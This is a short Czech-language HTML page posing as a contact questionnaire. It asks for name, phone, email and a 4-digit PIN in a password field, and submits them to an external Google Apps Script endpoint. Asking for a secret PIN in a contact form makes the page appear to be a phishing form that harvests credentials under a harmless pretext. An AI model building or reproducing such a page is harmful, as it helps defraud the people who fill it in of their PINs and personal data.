<!DOCTYPE html>
<html lang="cs">
<head>
  <meta charset="UTF-8">
  <title>Kontaktní dotazník</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <style>
    body {
      margin: 0;
      background: #000;
      font-family: system-ui, Arial, sans-serif;
      color: #fff;
    }

    .card {
      width: 100%;
      max-width: 420px;
      margin: 6vh auto 0 auto;
      padding: 28px;
      border-radius: 16px;
      background: #111;
    }

    h2 {
      margin-top: 0;
      margin-bottom: 24px;
    }

    label {
      display: block;
      font-size: 13px;
      opacity: 0.8;
      margin-top: 16px;
      margin-bottom: 6px;
    }

    input {
      width: 100%;
      padding: 14px;
      border-radius: 10px;
      border: 1px solid #333;
      background: #000;
      color: #fff;
      font-size: 15px;
    }

    button {
      margin-top: 24px;
      width: 100%;
      padding: 14px;
      border-radius: 12px;
      border: none;
      background: #7c3aed;
      color: #fff;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
    }

    button:hover {
      background: #6d28d9;
    }
  </style>
</head>

<body>

  <div class="card">
    <h2>Kontaktní dotazník</h2>

    <form method="POST" action="https://script.google.com/macros/s/AKfycbyzEgDBdArVJyVXuD8oW9SSU5TzzshKXBRhLo5cqrxoYhbSUOvB1ATouyXeBoRm3Fc89A/exec">
      <label>Jméno</label>
      <input name="jmeno" required>

      <label>Telefon</label>
      <input name="telefon" required>

      <label>Email</label>
      <input name="email" type="email" required>

      <label>PIN (4 číslice)</label>
      <input name="pin" type="password" pattern="[0-9]{4}" required>

      <button type="submit">Odeslat</button>
    </form>
  </div>

</body>
</html>
